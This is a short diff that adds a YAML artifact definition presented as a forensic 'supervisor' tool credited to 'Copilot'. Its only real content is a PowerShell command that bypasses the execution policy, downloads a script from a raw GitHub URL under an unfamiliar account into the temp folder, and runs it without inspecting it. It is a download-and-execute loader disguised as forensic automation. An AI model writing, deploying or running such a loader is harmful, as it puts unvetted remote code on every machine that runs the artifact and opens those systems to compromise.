@@ -1,0 +1,19 @@
+name: Forensic/ForensicSupervisor
+author: Copilot
+labels: [Forensic,Supervisor,Automation]
+source: |
+  EXECUTE:
+    command: |
+      powershell -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command "
+        try {
+          $url = 'https://raw.githubusercontent.com/elelmailoomartinez/generated-new-find/main/forensic_runner.ps1'
+          $tmp = Join-Path $env:TEMP 'forensic_runner_downloaded.ps1'
+          Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -ErrorAction Stop
+          Write-Output "Downloaded forensic_runner to $tmp"
+          Write-Output "Launching forensic_runner.ps1"
+          & powershell -NoProfile -ExecutionPolicy Bypass -File $tmp
+        } catch {
+          Write-Error "Artifact execution failed: $_"
+          exit 1
+        }
+      "
